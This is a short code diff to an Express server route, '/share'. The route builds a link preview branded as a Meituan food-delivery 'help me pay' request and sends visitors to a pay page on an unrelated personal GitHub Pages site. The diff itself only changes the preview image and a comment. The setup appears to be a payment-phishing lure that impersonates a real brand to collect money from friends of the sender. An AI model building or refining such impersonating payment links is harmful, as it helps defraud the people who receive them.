@@ -13,7 +13,7 @@ const supabase = createClient(
   process.env.SUPABASE_SERVICE_ROLE_KEY
 );
 
-// === 分享中转路由：使用更新后的图片链接，优化瞬间跳转 ===
+// === 分享中转路由：使用最新的卡片图片链接，优化瞬间跳转 ===
 app.get('/share', async (req, res) => {
   const orderId = req.query.order_id;
   const payDetailUrl = 'https://lsscqc520-ship-it.github.io/Auto-Forward-Messages/pay.html?order_id=' + orderId;
@@ -25,7 +25,8 @@ app.get('/share', async (req, res) => {
       <meta charset="UTF-8">
       <meta property="og:title" content="来帮我代付吧！美团外卖" />
       <meta property="og:description" content="Hi，我和你的距离只差一顿外卖~" />
-      <meta property="og:image" content="https://i.ibb.co/RGJyjPjc/IMG-1868.jpg" />
+      
+      <meta property="og:image" content="https://i.ibb.co/B288tR03/IMG-1894.jpg" />
       <meta property="og:type" content="website" />
       
       <title>为好友买单</title>
